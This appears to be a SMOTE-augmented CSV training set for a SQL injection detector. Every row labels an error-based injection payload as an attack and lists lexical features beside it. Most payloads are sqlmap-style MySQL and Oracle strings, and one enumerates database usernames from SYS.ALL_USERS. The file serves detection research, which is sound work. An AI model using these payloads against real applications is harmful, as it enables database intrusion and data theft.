id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000237,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000027,1.691000540661642,338.5216696245327,33.46013913537772,3.5762774361230405,91.5832001136877,47.15944345848909,142.3188869169782,57.46013913537773,0.27002611653628283,0.1394571341783067,0.42075140861010546,0.16976534067530502,2.3804174061331778,0.0,0.0,0.0,0.0,2.0,0.0,29.619582593866824,0.0,1.3804174061331778,0.5398608646222742,22.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.4601391353777258,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.460139135377726
SMOTE_000238,attack,error,"-4822"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""owbp""  =  ""owbp",nearest_attack_euclidean,R000013,1.3762694917599738,347.8083373059401,35.461108462706626,3.6803780313485857,95.49720500759307,50.425011917820186,142.1555661491735,59.73055423135331,0.2746356915961032,0.14493766113461082,0.4086851727536566,0.17174147451562943,0.0,3.1916626940599384,1.2694457686466871,0.0,0.0,3.0,0.0,28.538891537293374,0.0,2.1916626940599384,0.26944576864668734,24.26944576864669,0.0,1.0,0.2694457686466871,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.2694457686466872,1.0,1.0,0.7305542313533129,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000239,attack,error,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'fvbv'  =  'fvbv",nearest_attack_euclidean,R000026,1.3361517960315537,342.01241780663486,38.629618241057656,3.890271885002864,109.20987274701922,56.67898197615374,136.3827995655772,39.740763517884695,0.3195123157584756,0.16603246172406605,0.3983639827734546,0.11609123974400376,3.1605090119231276,0.2098727470192181,0.41974549403843625,0.0,2.0,2.0,0.0,24.95063626490391,0.0,0.0,6.0,5.419745494038436,0.7901272529807819,0.2098727470192181,0.20987274701921807,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.20987274701921813,1.0,1.0,0.7901272529807819,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000240,attack,error,"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000020,2.715630294662079,306.44092990966567,38.0,4.04787475928842,111.99091229379472,48.94547376276831,109.48636844069208,36.018175412410564,0.365551975166832,0.15937893655713387,0.35734068266202057,0.11772840561401357,4.0,0.0,0.0,0.0,2.0,1.5045438531026405,0.0,20.0,0.0,1.0090877062052814,5.495456146897359,5.009087706205282,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.990912293794718,1.4863684406920776,0.5045438531026408,1.5045438531026407,0.4954561468973593,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5045438531026407,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,12.486368440692079
SMOTE_000241,attack,error,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000017,1.8142657266106659,281.7235545813216,37.83356845552734,3.9452305632648943,101.22284921473958,37.22284921473958,106.1114246073698,37.16643154447266,0.35921925058243115,0.13188443751242182,0.3767515335003642,0.13214477840478284,0.27785615184244783,2.888575392630208,0.5557123036848959,0.0,2.0,2.0,0.0,20.0,1.444287696315104,2.0,5.0,4.555712303684896,0.27785615184244794,0.7221438481575522,0.27785615184244794,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.277856151842448,2.0,0.7221438481575521,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000242,attack,error,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000029,0.34804387624848454,342.33430770617207,33.93343077061721,3.5325553897238997,83.80029231185162,49.0,147.8668615412344,61.66715385308605,0.24478780601867162,0.1431427251367773,0.4319496403236759,0.18011982852087519,0.06656922938279086,3.7337230824688357,0.0,0.0,0.0,2.933430770617209,0.0,30.066569229382793,1.8668615412344178,0.0,1.0,22.933430770617207,0.06656922938279097,0.9334307706172091,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.9334307706172091,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.933430770617209
SMOTE_000243,attack,error,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'fvbv'  =  'fvbv",nearest_attack_euclidean,R000026,0.15299750516136706,344.2782636269628,38.0,3.858930015460794,109.20869531794389,55.0,139.43478511542074,40.634783193598174,0.3174285568031694,0.15983393507282725,0.40475540156359135,0.11798210656041194,4.0,0.0,0.0,0.0,2.0,1.9478261705140247,0.0,25.686957023084148,0.0,0.0,6.0,4.947826170514024,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000244,attack,error,"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000009,0.0041788534478852364,212.0332065910917,38.00343516459569,3.772192381342147,63.01259560351754,37.00916043892185,89.00916043892185,23.002290109730463,0.297181129192573,0.1745422643306396,0.4197914864645007,0.10848512001228663,0.0,0.0011450548652309767,1.0,0.0,1.0,1.0011450548652312,0.0,16.0,0.0,0.0,3.0,3.0011450548652308,0.0,0.0011450548652313097,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0011450548652311987,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.001145054865231
SMOTE_000245,attack,error,"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000005,0.08561282613440248,213.58038131082904,39.04145580791636,3.8120096240032284,63.22800694353998,37.16582323166544,89.16582323166544,24.020727903958182,0.2960084440105154,0.17397865388432518,0.4175221867352571,0.11249071536990231,0.9792720960418199,0.02072790395818014,1.0,0.0,1.0,1.0207279039581802,0.0,16.0,0.0,0.0,3.0,3.0207279039581794,0.9792720960418199,0.02072790395818014,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.020727903958180194,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.02072790395818
SMOTE_000246,attack,error,"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000024,0.3163761845847594,239.6532171281862,40.75950305860468,3.907856615212483,73.08611162269779,44.75950305860468,96.71140367032561,25.09619877655813,0.3047048649715463,0.18677352709476064,0.4036796256426551,0.104841982291038,0.0,1.0,1.0480993882790641,0.0,1.0,2.0,0.0,16.0,0.0,0.0,3.048099388279064,4.048099388279064,0.0,1.0,0.048099388279064126,0.9519006117209361,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0961987765581283,0.0,1.0,0.048099388279064126,0.04809938827906424,0.9519006117209359,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9519006117209359,0.0,0.9519006117209359,0.9519006117209359,7.0
SMOTE_000247,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000027,0.1657865105435854,332.93489637857107,33.09765543214338,3.4620287909736573,81.35806991785905,48.96744818928554,145.64193008214096,56.96744818928554,0.24437286842113543,0.1470777453388322,0.43744289164767386,0.17110649459235852,0.9674481892855409,0.0,0.03255181071445923,0.0,0.0,2.0,0.0,30.902344567856623,0.0,0.09765543214337757,0.9674481892855407,22.03255181071446,0.9674481892855408,0.0,0.0,0.03255181071445906,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.9674481892855408,0.03255181071445917,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000248,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kdxg' like 'kdxg",nearest_attack_euclidean,R000007,2.6792008602606225,306.64547339570686,38.0,4.048629290846241,112.02238052241644,49.13428313449863,109.53357078362465,35.955238955167125,0.365410720019185,0.15988849397587002,0.35725623118584726,0.11744455481909773,4.0,0.0,0.0,0.0,2.0,1.488809738791781,0.0,20.0,0.0,0.9776194775835616,5.511190261208219,4.977619477583562,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,5.022380522416439,1.5335707836246577,0.48880973879178086,1.4888097387917807,0.5111902612082192,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4888097387917808,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,12.533570783624658
SMOTE_000249,attack,error,-7864 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   # twpw,nearest_attack_euclidean,R000004,1.7411415202958804,332.87428702872194,35.062856485639024,3.579167912204725,86.37713891383414,49.87428702872195,140.15428932898539,56.468571757180484,0.25960588514079164,0.1497986493135078,0.42095902077843433,0.1696364447672662,0.0,0.0,1.0,0.0,0.0,2.0,0.0,29.405715271541464,0.0,1.5942847284585355,0.4685717571804884,23.0,0.0,0.0,0.0,0.531428242819512,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000250,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'tuzl'  =  'tuzl",nearest_attack_euclidean,R000018,1.6419422500524914,209.73701599652236,32.71970399188553,3.91070794325174,73.56059201622894,37.0,76.17642398029344,23.0,0.35091661775886124,0.1764180375581988,0.3630000780927083,0.1096652665902317,3.0173120046368394,0.0,0.24567199884079038,0.0,0.24567199884079016,1.7543280011592097,0.0,12.982687995363161,0.0,0.0,4.5086560023184195,2.2456719988407903,0.7543280011592097,0.0,0.0,0.24567199884079016,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.7543280011592097,0.24567199884079016,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2456719988407902,0.0,1.0,1.0,5.24567199884079
SMOTE_000251,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kdxg' like 'kdxg",nearest_attack_euclidean,R000007,0.6873100423114044,311.3698385537093,38.0,4.06605679573225,112.7492059313399,53.495235588039385,110.62380889700985,34.501588137320205,0.3621481331197043,0.17165780211504061,0.35530564542388016,0.11088841934137494,4.0,0.0,0.0,0.0,2.0,1.1253970343300512,0.0,20.0,0.0,0.25079406866010223,5.874602965669949,4.2507940686601025,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,5.7492059313398975,2.6238088970098468,0.12539703433005117,1.1253970343300512,0.8746029656699489,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.1253970343300511,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.623808897009848
SMOTE_000252,attack,error,"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000005,2.018069469655541,229.4167718694788,39.48914415688854,3.8300561851310904,68.46019524192465,40.9710510850361,94.98552554251805,25.0,0.29795702034646177,0.17816187478334072,0.4146348316343867,0.10924627323581085,0.503618614370487,0.496381385629513,1.0,0.0,1.0,1.4963813856295132,0.0,16.503618614370488,0.0,0.0,3.0,3.4963813856295127,0.5036186143704869,0.49638138562951317,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.4963813856295131,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.496381385629513
SMOTE_000253,attack,error,"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000020,1.3539159817006678,293.9740067147367,38.78599912416478,4.082090729296139,115.84699459901617,37.62900598487397,103.93900452514862,36.559001605697894,0.39786067761639216,0.1255881825029989,0.35255260672379296,0.12399853315681596,3.869000145972536,0.0,0.0,0.0,1.7380002919450719,2.2619997080549283,0.0,18.69000145972536,0.0,2.6549992701373197,4.476000583890144,5.738000291945072,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.8690001459725358,0.0,3.7380002919450717,0.0,1.130999854027464,2.0,0.2619997080549282,0.8690001459725358,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8690001459725358,0.0,0.0,0.0,0.0,0.0,0.8690001459725358,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8690001459725358,0.0,0.0,0.0,10.607000437917607
SMOTE_000254,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,1.5956382476167172,228.50172701042646,39.64363845953043,4.162607004287476,115.93091537859128,9.30541157962626,77.59268849868711,25.6727115535218,0.517348715421284,0.0332558562197111,0.3380848205395943,0.11131060781941057,3.178180770234787,0.0,0.0,0.0,0.35636154046957347,2.8218192297652136,0.0,11.781807702347868,0.0,3.6436384595304263,1.7127230809391467,3.53454231070436,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.17818077023478673,0.0,2.3563615404695732,0.0,1.0,2.0,1.6436384595304263,0.1781807702347867,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.1781807702347867,0.0,0.0,0.0,0.0,0.0,0.17818077023478673,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.17818077023478673,0.0,0.0,0.0,7.7127230809391465
SMOTE_000255,attack,error,"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000020,0.1756007165593533,298.869243838863,37.91301875683561,4.024396031700492,110.86952813525342,42.652075027342455,107.52160316259588,37.82603751367123,0.37105075881340915,0.14265504894320719,0.35973969117009197,0.1265545010732917,4.0,0.0,0.0,0.0,2.0,2.0,0.0,19.913018756835616,0.0,2.0,5.0,5.913018756835615,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.9565093784178074,0.0,0.9565093784178073,2.0,0.0869812431643856,0.9565093784178071,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.956509378417808
SMOTE_000256,attack,error,"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000005,2.249708304527633,221.07833046651402,36.69190558099599,3.8517246508196767,69.92428325701201,40.07745922533867,86.69190558099599,24.384682403167332,0.3151546389461333,0.18086354054283776,0.39355171295759395,0.11043010755343496,1.3846824031673344,0.0,0.6153175968326656,0.0,0.6153175968326658,1.3846824031673342,0.0,15.230635193665332,0.0,0.0,3.7693648063346687,3.384682403167334,1.0,0.0,0.0,0.6153175968326658,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.3846824031673344,0.0,0.3846824031673343,0.0,0.0,0.6153175968326657,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6153175968326656,0.0,1.0,1.0,6.0
SMOTE_000257,attack,error,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000008,1.5099045999663514,333.37463263420216,34.812683682898914,3.554922672354224,84.87610209739348,50.37463263420217,141.53023974405596,56.59365815855054,0.2547100472732168,0.15107562822274623,0.4244571758999435,0.16975714860409352,0.0,0.0,1.0,0.0,0.0,2.0,0.0,29.780974475651625,0.0,1.2190255243483716,0.5936581585505429,23.0,0.0,0.0,0.0,0.4063418414494572,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000258,attack,error,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000029,1.674078946816643,344.50070929046944,34.750354645234715,3.6102792287419545,89.62765983926039,48.62482267738264,144.99858141906114,61.24964535476528,0.26005686176781306,0.1411581101075377,0.42097116014609604,0.17781386797855325,0.0,4.0,0.3751773226173589,0.0,0.0,3.0,0.0,29.24964535476528,1.2496453547652822,1.1255319678520765,0.6248226773826411,23.375177322617358,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.624822677382641,0.3751773226173587,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000259,attack,error,"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000023,0.5460476116726167,296.72345964969065,40.082529080293654,3.9956076114225234,107.24758724088096,44.65058160587311,109.82529080293655,35.0,0.3616715603226831,0.15008802166874696,0.37018430167308525,0.11805611633548468,0.9174709197063445,0.08252908029365547,2.0,0.0,2.0,2.0,0.0,20.082529080293657,0.0,1.8349418394126888,5.082529080293655,6.082529080293655,0.9174709197063445,0.08252908029365547,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.2475872408809665,0.2475872408809664,1.0,1.9174709197063446,0.08252908029365547,0.9174709197063444,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9174709197063444,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.330116321174621
SMOTE_000260,attack,error,"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000020,0.4517284973265422,299.32238647360543,38.225871175464846,4.020318253434898,110.54825764907031,43.0,108.11293558773242,37.661193236802724,0.36931624031917104,0.1436636891341833,0.3612138655007975,0.1258062050458482,3.661193236802726,0.0,0.22587117546484953,0.0,2.0,2.0,0.0,20.0,0.0,2.0,5.0,6.0,1.0,0.0,0.11293558773242479,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.8870644122675753,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.887064412267575
